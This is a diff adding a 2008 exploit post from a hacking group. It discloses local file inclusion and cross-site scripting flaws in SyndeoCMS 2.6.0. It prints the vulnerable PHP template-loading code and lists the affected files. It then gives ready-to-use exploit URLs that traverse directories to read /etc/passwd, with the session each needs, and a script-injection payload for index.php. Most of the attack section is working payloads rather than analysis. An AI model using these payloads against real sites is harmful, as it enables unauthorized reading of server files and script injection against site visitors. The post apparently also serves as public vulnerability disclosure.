@@ -1,0 +1,77 @@
+===========================================================
+ SyndeoCMS 2.6.0 (LFI/XSS) Multiple Remote Vulnerabilities
+===========================================================
+
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /           
+  / XXXXXX /
+ (________(             
+  `------'
+
+
+AUTHOR : CWH Underground
+DATE : 10 June 2008
+SITE : www.citec.us
+
+
+#####################################################
+ APPLICATION : SyndeoCMS
+ VERSION     : 2.6.0 (Lastest Version)
+ DOWNLOAD    : http://downloads.sourceforge.net/syndeocms
+#####################################################
+
+---LFI---
+
+#################################################################
+Vulnerable Code:
+if (IsSet ($_GET['template']))
+{
+	$template_path = ...;
+	$filename = $template_path . "/" . $_GET['template'];
+	if (file_exists($filename))
+	{
+		$handle = fopen($filename, "r");
+		$content = fread($handle, filesize($filename));
+		fclose($handle);
+	}
+}
+#################################################################
+
+Vulnerable File: 
+
+[+] starnet/editors/fckeditor/studenteditor.php
+[+] starnet/modules/sn_news/edit_content.php
+[+] starnet/modules/sn_newsletter/edit_content.php
+
+Exploit:
+
+[+] http://[target]/[path]/starnet/editors/fckeditor/studenteditor.php?template=../../../../../../../../../etc/passwd
+[+] http://[target]/[path]/starnet/index.php?option=modulemanager&module=16&modoption=edit_article&cat_id=1&article_id=0&template=../../../../../../../../../../../../../etc/passwd
+[+] http://[target]/[path]/starnet/index.php?option=modulemanager&module=17&modoption=edit_newsletter&newsletter_id=1&edition=1&template=../../../../../../../../../../../../../etc/passwd
+
+Note:      - the first link requires pupil session (normal student session)
+           - the second link and the third link require admin session
+
+
+---XSS---
+
+[+] index.php
+
+Example:
+
+http://[target]/[path]/index.php?page=1&section="><script>alert(111);</script>
+
+##################################################################
+# Greetz: ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos  #
+##################################################################
+
+update:
+see: http://www.syndeocms.org/forum/index.php?topic=1788.0
+
+# milw0rm.com [2008-06-10]
